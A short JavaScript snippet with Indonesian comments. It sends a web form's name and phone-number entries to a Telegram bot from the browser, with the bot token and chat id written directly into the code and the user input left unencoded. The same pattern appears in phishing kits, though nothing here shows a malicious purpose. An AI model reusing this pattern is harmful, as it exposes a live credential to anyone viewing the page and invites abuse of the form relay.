function kirimPesan() {

    var nama = document.getElementById('nama');
    var email = document.getElementById('email');

    var gabungan = 'Nama%20%3A%20' + nama.value + '%0ANo%20Hp%20%3A%20' + email.value;

    var token = '6664277601:AAHHehNJwPf18Ezvcvj6jpLwhdQOaAAUoro'; // Ganti dengan token bot yang kamu buat
    var grup = '5908088214'; // Ganti dengan chat id dari bot yang kamu buat

    $.ajax({
        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
        method: `POST`,
    })
}